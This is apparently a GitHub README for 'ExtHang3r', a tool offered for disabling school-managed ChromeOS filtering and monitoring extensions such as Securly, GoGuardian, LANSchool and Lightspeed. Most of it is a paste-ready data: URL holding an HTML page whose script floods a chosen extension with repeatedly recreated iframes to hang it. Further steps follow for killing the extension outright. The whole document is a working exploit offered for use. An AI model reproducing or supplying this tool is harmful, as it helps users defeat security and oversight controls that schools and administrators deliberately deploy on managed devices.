# ExtHang3r
ExtHang3r is an exploit that allows ChromeOS users to hang extensions after the LTMEAT patch. It can also be used to kill extensions, not just hang them. In order to kill the extension, hang the extension by pressing the button and then open any of the extension's pages. Then go to chrome://extensions and find the extension that you hung. Flip the allow access to file URLs ONLY ONCE.
```
data:text/html;charset=utf-8,%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%3Ctitle%3EExtHang3r%3C%2Ftitle%3E%0A%20%20%3Clink%20rel%3D%22shortcut%20icon%22%20type%3D%22image%2Fpng%22%20href%3D%22https%3A%2F%2Fblobby-boi.github.io%2FuBlobeBM%2Ffavicon.png%22%3E%0A%20%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DVarela%2BRound%26display%3Dswap%22%3E%0A%20%20%3Cstyle%3E%0A%20%20%20%20body%20%7B%0A%20%20%20%20%20%20font-family%3A%20'Varela%20Round'%2C%20sans-serif%3B%0A%20%20%20%20%20%20margin%3A%200%3B%0A%20%20%20%20%20%20padding%3A%200%3B%0A%20%20%20%20%7D%0A%20%20%20%20header%20%7B%0A%20%20%20%20%20%20background-color%3A%20%23333%3B%0A%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20padding%3A%2010px%3B%0A%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%7D%0A%20%20%20%20.logo%20%7B%0A%20%20%20%20%20%20width%3A%2050px%3B%0A%20%20%20%20%20%20height%3A%2050px%3B%0A%20%20%20%20%20%20margin-right%3A%2010px%3B%0A%20%20%20%20%7D%0A%20%20%20%20.container%20%7B%0A%20%20%20%20%20%20max-width%3A%20800px%3B%0A%20%20%20%20%20%20margin%3A%20130px%20auto%200%20auto%3B%0A%20%20%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%7D%0A%20%20%20%20select%20%7B%0A%20%20%20%20%20%20margin-bottom%3A%2010px%3B%0A%20%20%20%20%7D%0A%20%20%20%20button%20%7B%0A%20%20%20%20%20%20font-family%3A%20'Varela%20Round'%2C%20sans-serif%3B%0A%20%20%20%20%20%20background-color%3A%20%23007bff%3B%0A%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20border%3A%20none%3B%0A%20%20%20%20%20%20padding%3A%2010px%2020px%3B%0A%20%20%20%20%20%20font-size%3A%2016px%3B%0A%20%20%20%20%20%20cursor%3A%20pointer%3B%0A%20%20%20%20%20%20border-radius%3A%205px%3B%0A%20%20%20%20%20%20margin-top%3A%2010px%3B%0A%20%20%20%20%7D%0A%20%20%20%20button%3Ahover%20%7B%0A%20%20%20%20%20%20background-color%3A%20%230056b3%3B%0A%20%20%20%20%7D%0A%20%20%20%20.overlay%20%7B%0A%20%20%20%20%20%20position%3A%20fixed%3B%0A%20%20%20%20%20%20top%3A%200%3B%0A%20%20%20%20%20%20left%3A%200%3B%0A%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20%20%20background-color%3A%20rgba(0%2C%200%2C%200%2C%200.5)%3B%0A%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20z-index%3A%209999%3B%0A%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20font-size%3A%2024px%3B%0A%20%20%20%20%7D%0A%20%20%20%20footer%20%7B%0A%20%20%20%20%20%20background-color%3A%20%23333%3B%0A%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20padding%3A%2010px%3B%0A%20%20%20%20%20%20position%3A%20fixed%3B%0A%20%20%20%20%20%20bottom%3A%200%3B%0A%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%7D%0A%20%20%20%20.kill-extension-text%20%7B%0A%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20margin-top%3A%2020px%3B%0A%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%0A%3Cheader%3E%0A%20%20%3Cimg%20src%3D%22https%3A%2F%2Fblobby-boi.github.io%2FuBlobeBM%2Ffavicon.png%22%20alt%3D%22Logo%22%20class%3D%22logo%22%3E%0A%20%20%3Ch1%3EExtHang3r%3C%2Fh1%3E%0A%3C%2Fheader%3E%0A%0A%3Cdiv%20class%3D%22container%22%3E%0A%20%20%3Cp%3EExtHang3r%20is%20an%20exploit%20that%20allows%20ChromeOS%20users%20to%20hang%20extensions%20after%20the%20LTMEAT%20patch.%20It%20can%20also%20be%20used%20to%20kill%20extensions%2C%20not%20just%20hang%20them.%3C%2Fp%3E%0A%20%20%3Clabel%20for%3D%22iframeSelect%22%3ESelect%20extension%3A%3C%2Flabel%3E%0A%20%20%3Cselect%20id%3D%22iframeSelect%22%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fjoflmkccibkooplaeoinecjbmdebglab%2Ffonts%2FMetropolis.css%22%3ESecurly%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fiheobagjkfklnlikgihanlhcddjoihkg%2Ffonts%2FMetropolis.css%22%3ESecurly%20(old)%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fhaldlgldplgnggkjaafhelgiaglafanh%2Fyoutube_injection.js%22%3EGoguardian%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fbaleiojnjpgeojohhhfbichcodgljmnj%2Fblocked.html%22%3ELANSchool%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fddfbkhpmcdbciejenfcolaaiebnjcbfc%2Fbackground%2Fassets%2Fpages%2Fdefault-blocked.html%22%3ELinewize%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fghlpmldmjjhmdgmneoaibbegkjjbonbk%2Fpages%2FblockPage.html%22%3EBlocksi%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Figbgpehnbmhgdgjbhkkpedommgmfbeao%2Fyoutube_injection.js%22%3EFortiguard%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fjcdhmojfecjfmbdpchihbeilohgnbdci%2Fblocked.html%22%3ECisco%20Umbrella%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fjdogphakondfdmcanpapfahkdomaicfa%2Fimg%2Fckauth19x.png%22%3EContentKeeper%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fodoanpnonilogofggaohhkdkdgbhdljp%2Fimg%2Fckauth19x.png%22%3ECK-Authenticator%20G3%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fjfbecfmiegcjddenjhlbhlikcbfmnafd%2Fnotfound.html%22%3ESecurly%20Classroom%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fkbohafcopfpigkjdimdcdgenlhkmhbnc%2Fblocked.html%22%3EHapara%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Faceopacgaepdcelohobicpffbbejnfac%2Fblocked.html%22%3EHapara%20(new%20ID)%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fkmffehbidlalibfeklaefnckpidbodff%2Frestricted.html%22%3Eiboss%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fadkcpkpghahmbopkjchobieckeoaoeem%2Ficon-128.png%22%3ELightspeed%20Filter%20Agent%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fkkbmdgjggcdajckdlbngdjonpchpaiea%2Fassets%2Ficon-classroom-128.png%22%3ELightspeed%20Classroom%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fjbddgjglgkkneonnineaohdhabjbgopi%2Fpages%2Fmessage-page.html%22%3EInterCLASS%20Filtering%20Service%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fecjoghccnjlodjlmkgmnbnkdcbnjgden%2Fresources%2Foptions.js%22%3EInterSafe%20GatewayConnection%20Agent%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fpabjlbjcgldndnpjnokjakbdofjgnfia%2Fimage%2Fallow_icon%2Fshield_green_128x128.png%22%3E%E3%83%AD%E3%82%A4%E3%83%ADWeb%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E3%83%BC%2FLoiLo%20Web%20Filters%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fcgbbbjmgdpnifijconhamggjehlamcif%2Fimages%2Fgopher-buddy_128x128_color.png%22%3EGopher%20Buddy%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fhonjcnefekfnompampcpmcdadibmjhlk%2Fblocked.html%22%3ELanSchool%20Web%20Helper%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fcgigopjakkeclhggchgnhmpmhghcbnaf%2Fmodels%2Fmodel.json%22%3EIMTLazarus%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Fjjpmjccpemllnmgiaojaocgnakpmfgjg%2Flicenses.html%22%3EImpero%20Backdrop%3C%2Foption%3E%0A%20%20%20%20%3Coption%20value%3D%22chrome-extension%3A%2F%2Ffgmafhdohjkdhfaacgbgclmfgkgokgmb%2Fblock.html%22%3EMobile%20Guardian%3C%2Foption%3E%0A%20%20%3C%2Fselect%3E%0A%20%20%3Cbutton%20onclick%3D%22warning()%3B%22%3EHang%20Extension!%3C%2Fbutton%3E%0A%3C%2Fdiv%3E%0A%0A%3Cdiv%20class%3D%22overlay%22%20id%3D%22overlay%22%3EHanging...%20DO%20NOT%20CLOSE%20THIS%20TAB%3C%2Fdiv%3E%0A%0A%3Cfooter%3E%0A%20%20%3Cp%3EMade%20by%20%3Ca%20href%3D%22https%3A%2F%2Fgithub.com%2FBlobby-Boi%2F%22%3EBlobby%20Boi%3C%2Fa%3E%3C%2Fp%3E%0A%3C%2Ffooter%3E%0A%0A%3Cdiv%20class%3D%22kill-extension-text%22%20id%3D%22killExtensionText%22%3E%0A%3C%2Fdiv%3E%0A%0A%3Cscript%3E%0A%20%20function%20replaceIframes(container%2C%20iframeSrc)%20%7B%0A%20%20%20%20for%20(var%20i%20%3D%200%3B%20i%20%3C%201000%3B%20i%2B%2B)%20%7B%0A%20%20%20%20%20%20var%20iframe%20%3D%20document.createElement('iframe')%3B%0A%20%20%20%20%20%20iframe.src%20%3D%20iframeSrc%3B%0A%20%20%20%20%20%20iframe.style.width%20%3D%20'10px'%3B%0A%20%20%20%20%20%20iframe.style.height%20%3D%20'10px'%3B%0A%20%20%20%20%20%20iframe.setAttribute('frameborder'%2C%20'0')%3B%0A%20%20%20%20%20%20container.appendChild(iframe)%3B%0A%20%20%20%20%7D%0A%20%20%20%20setTimeout(function()%20%7B%0A%20%20%20%20%20%20while%20(container.firstChild)%20%7B%0A%20%20%20%20%20%20%20%20container.removeChild(container.firstChild)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20replaceIframes(container%2C%20iframeSrc)%3B%0A%20%20%20%20%7D%2C%2010)%3B%0A%20%20%7D%0A%20%20%0A%20%20function%20warning()%20%7B%0A%20%20%20%20var%20overlay%20%3D%20document.getElementById(%22overlay%22)%3B%0A%20%20%20%20overlay.style.display%20%3D%20%22flex%22%3B%0A%20%20%20%20var%20iframeSelect%20%3D%20document.getElementById(%22iframeSelect%22)%3B%0A%20%20%20%20var%20selectedOption%20%3D%20iframeSelect.options%5BiframeSelect.selectedIndex%5D.text%3B%0A%20%20%20%20var%20selectedSrc%20%3D%20iframeSelect.value%3B%0A%20%20%20%20var%20popup%20%3D%20window.open(%22%22%2C%20%22PopupWindow%22%2C%20%22width%3D10000%2Cheight%3D10000%22)%3B%0A%20%20%20%20var%20popupDocument%20%3D%20popup.document%3B%0A%20%20%20%20var%20popupBody%20%3D%20popupDocument.body%3B%0A%20%20%20%20var%20iframeContainer%20%3D%20popupDocument.createElement('div')%3B%0A%20%20%20%20iframeContainer.id%20%3D%20'iframeContainer'%3B%0A%20%20%20%20popupBody.appendChild(iframeContainer)%3B%0A%20%20%20%20var%20centeredText%20%3D%20popupDocument.createElement('div')%3B%0A%20%20%20%20centeredText.textContent%20%3D%20'Hanging%20'%20%2B%20selectedOption%20%2B'%20DO%20NOT%20CLOSE%20THIS%20POPUP'%3B%0A%20%20%20%20centeredText.style.position%20%3D%20'absolute'%3B%0A%20%20%20%20centeredText.style.top%20%3D%20'50%25'%3B%0A%20%20%20%20centeredText.style.left%20%3D%20'50%25'%3B%0A%20%20%20%20centeredText.style.transform%20%3D%20'translate(-50%25%2C%20-50%25)'%3B%0A%20%20%20%20centeredText.style.fontFamily%20%3D%20'Varela%20Round'%3B%0A%20%20%20%20centeredText.style.color%20%3D%20'white'%3B%0A%20%20%20%20popupDocument.body.style.backgroundColor%20%3D%20'black'%3B%0A%20%20%20%20replaceIframes(iframeContainer%2C%20selectedSrc)%3B%0A%20%20%20%20setTimeout(function()%20%7B%0A%20%20%20%20%20%20popup.close()%3B%0A%20%20%20%20%20%20overlay.style.display%20%3D%20%22none%22%3B%0A%20%20%20%20%20%20var%20extensionId%20%3D%20selectedSrc.substring(selectedSrc.indexOf(%22%2F%2F%22)%20%2B%202%2C%20selectedSrc.indexOf(%22%2F%22%2C%20selectedSrc.indexOf(%22%2F%2F%22)%20%2B%202))%3B%20%2F%2F%20Extract%20extension%20ID%0A%20%20%20%20%20%20var%20extensionURL%20%3D%20%22chrome-extension%3A%2F%2F%22%20%2B%20extensionId%3B%0A%20%20%20%20%20%20document.getElementById(%22killExtensionText%22).innerHTML%20%3D%20%22In%20order%20to%20kill%20the%20extension%20%3Cstrong%3E%22%20%2B%20selectedOption%20%2B%20%22%3C%2Fstrong%3E%2C%20go%20to%20%3Cstrong%3E%22%20%2B%20extensionURL%20%2B%20%22%2Fmanifest.json%20%3C%2Fstrong%3E%20and%20then%20open%20a%20new%20tab%20and%20go%20to%20%3Cstrong%3Echrome%3A%2F%2Fextensions%2F%3Fid%3D%22%20%2B%20extensionId%20%2B%20%22%3C%2Fstrong%3E.%20Then%20flip%20the%20allow%20access%20to%20file%20URLs%20switch%20ONLY%20ONCE.%22%3B%0A%20%20%20%20%20%20document.getElementById(%22killExtensionText%22).style.display%20%3D%20%22block%22%3B%0A%20%20%20%20%20%20setTimeout(function()%20%7B%0A%20%20%20%20%20%20%20%20alert(selectedOption%20%2B%20%22%20was%20hanged%20successfully!%22)%3B%0A%20%20%20%20%20%20%7D%2C%203000)%3B%0A%20%20%20%20%7D%2C%2020000)%3B%0A%20%20%7D%0A%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E
```
